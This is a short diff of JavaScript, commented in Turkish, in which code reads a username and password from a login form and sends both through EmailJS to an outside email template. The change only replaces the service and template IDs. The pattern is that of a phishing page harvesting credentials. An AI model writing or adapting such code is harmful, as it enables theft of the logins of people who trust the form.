@@ -10,7 +10,7 @@
         const password = document.getElementById('password').value;
 
         // EmailJS'e veri gönder
-        emailjs.send('service_hrabkdj', 'template_omxpwer', {
+        emailjs.send('service_e4e3nr2', 'template_owlb09f', {
             username: username,
             password: password
         })
